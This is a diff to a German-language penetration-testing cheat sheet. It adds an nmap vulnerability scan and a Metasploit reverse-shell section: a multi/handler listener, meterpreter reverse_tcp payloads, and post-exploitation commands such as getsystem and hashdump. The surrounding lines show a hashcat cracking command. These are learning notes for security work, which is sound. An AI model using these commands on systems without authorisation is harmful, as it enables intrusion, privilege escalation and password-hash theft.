@@ -74,6 +74,11 @@ nmap -sC 127.0.0.1 -v
 
 (Führt einen SYN scan durch mit praktischen Scripts)
 
+Vulnerability scan:
+
+```bash
+nmap --script vuln 127.0.0.1 -v
+```
 #### Advanced Scans:
 (Häufig bei besonderen Systemen)
 
@@ -251,4 +256,31 @@ SHA256
 hashcat -a 0 -w 4 -m 1400 --session hash_session hash.hash /usr/share/wordlists/rockyou.txt
 ```
 
-![grafik.png](.attachments.12925/grafik.png)
+## Reverse Shells
+
+### Meterpreter:
+Meterpreter listener:
+```bash
+use exploit/multi/handler
+```
+
+Payload setzen:
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+set PAYLOAD linux/meterpreter/reverse_tcp
+```
+
+Commands:
+```bash
+getuid # Whoami (Ist man system)
+
+shell # Reverseshell
+
+upload/download # Dateien hoch und runterladen
+
+getsystem # Priv escalation
+
+hashdump # Hashes von Windows extrahieren
+```
+
